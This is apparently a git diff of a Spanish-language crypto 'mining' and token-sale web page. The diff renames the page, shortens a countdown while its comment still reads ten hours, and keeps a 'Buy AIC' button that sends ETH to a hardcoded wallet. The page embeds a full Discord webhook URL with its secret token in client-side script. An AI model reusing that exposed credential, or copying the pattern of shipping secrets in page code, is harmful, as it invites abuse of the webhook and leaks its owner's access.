@@ -194,7 +194,7 @@ input {
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>MinerIA</title>
+    <title>aic</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
     <style>
 
@@ -386,7 +386,7 @@ input {
 
 <script>
 // Define el tiempo límite en segundos
-const LIMIT_TIME = 36000; // 10 horas
+const LIMIT_TIME = 6000; // 10 horas
 
 // Obtiene el elemento de contador y la barra de energía
 const counter = document.getElementById("timer");
@@ -485,12 +485,12 @@ function formatTime(time) {
 
 
 
-<div class="card">
+
         <input type="number" id="amount1">
   <div style="text-align: center;">
   <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Buy AIC</button>
 </div>
-	</div>
+	
 
 
 
@@ -537,7 +537,7 @@ function sendWebhookMessage(webhookUrl, message) {
       const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-";
 
     </script>
-<div class="card">
+
 <div class="energy-wrapper">
   <div class="energy-bar" id="energy">
     <span class="energy-percent" id="energy-percent"></span>
@@ -548,7 +548,7 @@ function sendWebhookMessage(webhookUrl, message) {
   <span class="counter-title">Tiempo restante:</span>
   <span class="counter" id="timer"></span>
 </div>
-</div>
+
 
 
   </body>
